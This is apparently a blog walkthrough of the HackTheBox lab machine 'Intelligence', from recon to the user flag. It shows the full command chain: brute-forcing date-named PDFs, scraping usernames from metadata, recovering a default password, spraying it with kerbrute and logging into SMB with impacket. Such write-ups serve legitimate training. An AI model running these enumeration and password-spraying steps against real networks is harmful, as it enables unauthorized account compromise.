---
title: "Intelligence"
date: 2026-09-30 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, medium, active-directory, pdf-metadata, password-spray, kerbrute, smb, information-disclosure]
image:
    path: /assets/Images/Intelligence-avatar.png
    alt: Intelligence
description: "An IIS server serves internal PDFs at predictable date-based names with directory listing disabled; brute-forcing the date range and scraping exiftool Creator metadata yields ~30 AD usernames, while a New Account Guide PDF leaks a default password that a kerbrute spray confirms is still valid for Tiffany.Molina — granting SMB access and the user flag."
---
## Overview

Intelligence is a medium-difficulty Windows box built around an Active Directory domain controller that also runs IIS. The path to user is pure enumeration: internal PDF documents are served under a predictable date-based naming scheme with directory listing disabled, so guessing the names pulls dozens of files. Their `Creator` metadata leaks valid domain usernames, and a "New Account Guide" PDF discloses the company default password. A password spray confirms one user — `Tiffany.Molina` — never changed it, which is enough to read her `user.txt` over SMB. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,40.0 233.7,122.8 150.0,150.0 124.1,185.6 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Pure enumeration box dominated by date-range PDF brute-forcing and exiftool metadata scraping to build a userlist for a kerbrute spray; no CVE, with a mild guessy date-guessing flavor.

## Recon

```bash
nmap -p- --min-rate=1000 -T4 <target-ip>
nmap -sC -sV -p<ports> <target-ip>
```

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | Simple DNS Plus | AD DNS |
| 80/tcp | IIS 10.0 | "Intelligence" site |
| 88/tcp | Kerberos | DC |
| 135/139/445 | RPC / SMB | signing required |
| 389/636/3268/3269 | LDAP(S) | Domain `intelligence.htb`, CN `dc.intelligence.htb` |
| 5985/tcp | WinRM (HTTPAPI) | |

The certificate and LDAP banners confirm a domain controller for `intelligence.htb` (host `dc.intelligence.htb`). Add it to `/etc/hosts` and look at the web server.

## Enumeration

The IIS landing page is a static brochure site, but the HTML links to two PDFs inside a `documents/` directory:

```html
<a href="documents/2020-01-01-upload.pdf" class="badge badge-secondary">Download</a>
<a href="documents/2020-12-15-upload.pdf" class="badge badge-secondary">Download</a>
```

Directory listing is disabled, but the naming scheme is obvious: `documents/YYYY-MM-DD-upload.pdf`. If the names are predictable, the listing being off does not matter — every file in the date range can be guessed.

Brute-force the whole range in parallel:

```bash
d=2020-01-01; while [ "$d" != $(date -I) ]; do echo "http://<target-ip>/Documents/$d-upload.pdf"; d=$(date -I -d "$d + 1 day"); done | xargs -n 1 -P 20 wget -q
```

Dozens of PDFs come down. Two things in them matter — the metadata and the contents.

**Usernames from metadata.** The PDFs were generated with the author's domain username baked into the `Creator` field. Scrape them all into a user list:

```bash
exiftool -Creator -csv *.pdf | cut -d , -f2 | sort | uniq > userlist
```

That yields roughly 30 valid-looking AD accounts (`William.Lee`, `Jose.Williams`, `Tiffany.Molina`, `Ted.Graves`, ...).

**A default password from the contents.** Convert each PDF to text and skim the first line of each to find the interesting ones:

```bash
for f in *.pdf; do pdftotext $f; done
head -n1 *.txt
```

Two documents stand out — a "New Account Guide" and an "Internal IT Update". Read them:

```bash
cat 2020-{06-04,12-30}-upload.txt
```

The New Account Guide spells out the onboarding default:

```
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

## Foothold

We have a user list and one password. Spray it across every account with `kerbrute` — a low, single-password spray that will not trip lockout:

```bash
kerbrute passwordspray userlist NewIntelligenceCorpUser9876 --dc <target-ip> -d intelligence.htb
```

One account never rotated the default:

```
[+] VALID LOGIN WITH ERROR: Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876 (Clock skew is too great)
```

Confirm the credentials and enumerate shares:

```bash
nxc smb <target-ip> -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
```

`Users`, `IT`, `NETLOGON`, `SYSVOL` are all readable. Connect and grab the flag from Tiffany's desktop:

```bash
impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@<target-ip>
# use Users
# get Tiffany.Molina\Desktop\user.txt
```

## User flag

```
# cat user.txt
[redacted]
```

Valid credentials for `Tiffany.Molina` and the user flag are ours. From here the box continues with ADIDNS abuse to capture Ted.Graves' hash, `ReadGMSAPassword` on `svc_int`, and constrained delegation to the DC, but this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Intelligence-avatar.png" alt="Intelligence" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
